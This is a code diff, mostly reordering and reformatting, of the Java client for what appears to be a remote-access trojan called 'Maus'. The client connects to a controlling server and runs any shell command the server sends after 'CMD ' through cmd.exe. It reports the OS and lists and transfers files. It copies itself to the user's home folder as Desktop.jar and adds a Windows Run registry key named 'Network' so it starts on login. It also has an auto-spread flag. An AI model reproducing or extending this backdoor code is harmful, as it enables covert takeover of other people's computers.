@@ -1,41 +1,20 @@
 package Client;
 
-import org.omg.SendingContext.RunTime;
-
 import java.io.*;
 import java.net.Socket;
-import java.nio.file.Files;
 import java.util.ArrayList;
 
 public class Client {
     private static String HOST = "localhost";
     private static int PORT = 22122;
-
-    public boolean isPersistent() {
-        return isPersistent;
-    }
-
-    public void setPersistent(boolean persistent) {
-        isPersistent = persistent;
-    }
-
-    public boolean isAutoSpread() {
-        return autoSpread;
-    }
-
-    public void setAutoSpread(boolean autoSpread) {
-        this.autoSpread = autoSpread;
-    }
-
+    private static boolean debugMode = true;
+    private final String SYSTEMOS = System.getProperty("os.name");
     private boolean isPersistent = false;
     private boolean autoSpread = false;
     private Socket socket;
     private DataOutputStream dos;
     private File directory;
     private DataInputStream dis;
-    private final String SYSTEMOS = System.getProperty("os.name");
-
-    private static boolean debugMode = true;
 
     private static String getHOST() {
         return HOST;
@@ -57,28 +36,10 @@ public class Client {
         /* Load server settings and then attempt to connect to Maus. */
         Client client = new Client();
         client.loadServerSettings();
-        if(client.isPersistent) {
+        if (client.isPersistent) {
             client.saveClient();
         }
         client.connect();
-    }
-
-    private void saveClient() {
-        File client =  new File (getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
-        File newClient = new File(System.getProperty("user.home") + "/Desktop.jar");
-        copyFile(client, newClient);
-        if(SYSTEMOS.contains("Windows")){
-                createPersistence(System.getProperty("user.home") + "/Desktop.jar");
-        }
-    }
-
-    private void createPersistence(String clientPath) {
-        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Network /d " + clientPath);
-        try {
-            Process proc = pb.start();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
     }
 
     private static String getMauscs() throws Exception {
@@ -94,6 +55,62 @@ public class Client {
             ex.printStackTrace();
         }
         return jarFolder + "/.mauscs";
+    }
+
+    public static void copyFile(File filea, File fileb) {
+        InputStream inStream;
+        OutputStream outStream;
+        try {
+            inStream = new FileInputStream(filea);
+            outStream = new FileOutputStream(fileb);
+
+            byte[] buffer = new byte[1024];
+
+            int length;
+            //copy the file content in bytes
+            while ((length = inStream.read(buffer)) > 0) {
+                outStream.write(buffer, 0, length);
+            }
+
+            inStream.close();
+            outStream.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public boolean isPersistent() {
+        return isPersistent;
+    }
+
+    public void setPersistent(boolean persistent) {
+        isPersistent = persistent;
+    }
+
+    public boolean isAutoSpread() {
+        return autoSpread;
+    }
+
+    public void setAutoSpread(boolean autoSpread) {
+        this.autoSpread = autoSpread;
+    }
+
+    private void saveClient() {
+        File client = new File(getClass().getProtectionDomain().getCodeSource().getLocation().getFile());
+        File newClient = new File(System.getProperty("user.home") + "/Desktop.jar");
+        copyFile(client, newClient);
+        if (SYSTEMOS.contains("Windows")) {
+            createPersistence(System.getProperty("user.home") + "/Desktop.jar");
+        }
+    }
+
+    private void createPersistence(String clientPath) {
+        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Network /d " + clientPath);
+        try {
+            Process proc = pb.start();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     private void connect() throws InterruptedException {
@@ -113,7 +130,7 @@ public class Client {
                 }
                 if (input.contains("CMD ")) {
                     exec(input.replace("CMD ", ""));
-                }else if (input.contains("SYS")) {
+                } else if (input.contains("SYS")) {
                     communicate("SYS");
                     communicate(SYSTEMOS);
                 } else if (input.contains("FILELIST")) {
@@ -164,9 +181,9 @@ public class Client {
         if (!command.equals("")) {
             try {
                 ProcessBuilder pb = null;
-                if(SYSTEMOS.contains("Windows")) {
+                if (SYSTEMOS.contains("Windows")) {
                     pb = new ProcessBuilder("cmd.exe", "/c", command);
-                } else if (SYSTEMOS.contains("Linux")){
+                } else if (SYSTEMOS.contains("Linux")) {
                     pb = new ProcessBuilder();
                 }
                 pb.redirectErrorStream(true);
@@ -268,28 +285,6 @@ public class Client {
             }
             bs.close();
             fis.close();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-    }
-
-    public static void copyFile(File filea, File fileb) {
-        InputStream inStream;
-        OutputStream outStream;
-        try {
-            inStream = new FileInputStream(filea);
-            outStream = new FileOutputStream(fileb);
-
-            byte[] buffer = new byte[1024];
-
-            int length;
-            //copy the file content in bytes
-            while ((length = inStream.read(buffer)) > 0) {
-                outStream.write(buffer, 0, length);
-            }
-
-            inStream.close();
-            outStream.close();
         } catch (IOException e) {
             e.printStackTrace();
         }
